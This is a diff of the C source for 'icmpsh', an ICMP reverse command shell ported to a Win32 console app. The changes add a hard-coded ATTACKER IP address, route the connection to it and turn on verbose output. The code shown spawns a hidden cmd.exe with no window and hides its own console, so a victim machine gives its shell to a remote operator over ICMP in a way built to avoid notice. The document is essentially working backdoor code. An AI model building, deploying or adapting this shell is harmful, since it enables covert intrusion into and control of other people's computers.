@@ -1,27 +1,10 @@
 /*
 *   icmpsh - simple icmp command shell
 *   Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>
-*   and blah, blah...
-**********************************************************
-*   This is amazing stuff and Nico deserves all my respect
-**********************************************************
 
-     Modified by me F.Zinzloun.Bersani to a Win32 C console app. Folloows configuration in VS 2015:
-	 - create a C++ Win32 Console App
-	 - delete all the headers file, leave only the main cpp file
-	 - copy the content of this file inside the main cpp file. Change the extension of the file in .c
-	 - open the project's properties window,expand C/C++, select All options and set the following:
-		-Compile as: Compile as C code/TC
-		-Precompiled Headers: Not using precompiled headers
-		-Runtime library to Multi-threaded/MT (will include the visual c++ runtime in the exe)
-	That should be enough. Generate it
-	Tested on Windows Server 2012 64bit, Windows 10 Home Edition 64 bit
-		
-
+Modified by me F.Zinzloun.Bersani to a Win32 C console app. Folloows configuration in VS 2015:
 */
-/*******************************************************************/
-/*CONFIGURE THE ATTACKER IP AROUND LINE 200*/
-/******************************************************************/
+
 
 //me: avoid ERROR COMPILING in VS
 #pragma warning(disable:4996)
@@ -51,7 +34,9 @@
 
 FARPROC icmp_create, icmp_send, to_ip;
 
-int verbose = 0;
+int verbose = 1;
+
+extern char ATTACKER[] = "192.168.1.66"; //TO BE CONFIGURED
 
 int spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)
 {
@@ -92,7 +77,7 @@ int spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)
 	si.hStdOutput = out_write;
 	si.hStdInput = in_read;
 	si.wShowWindow = SW_HIDE;//hide the cmd
-	//it's necessary to set CREATE_NO_WINDOW as well
+							 //it's necessary to set CREATE_NO_WINDOW as well
 	TCHAR cmd[256] = L"cmd";
 	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFO)&si, pi)) {
 		return STATUS_PROCESS_NOT_CREATED;
@@ -194,13 +179,12 @@ int load_deps()
 }
 
 //FB: this is necessary to hide the console window. this is a dirty solution that could be improved
-void HideConsole(){ShowWindow(GetConsoleWindow(), SW_HIDE);}
+void HideConsole() { ShowWindow(GetConsoleWindow(), SW_HIDE); }
 
 
 int main(int argc, char **argv)
 {
-	char *target;
-	target = "192.168.1.101"; //TO BE CONFIGURED
+	
 	unsigned int delay, timeout;
 	unsigned int ip_addr;
 	HANDLE pipe_read, pipe_write;
@@ -228,7 +212,7 @@ int main(int argc, char **argv)
 		return -1;
 	}
 
-	ip_addr = to_ip(target);
+	ip_addr = to_ip(ATTACKER);
 
 	// don't spawn a shell if we're only sending a single test request
 	if (status != STATUS_SINGLE) {
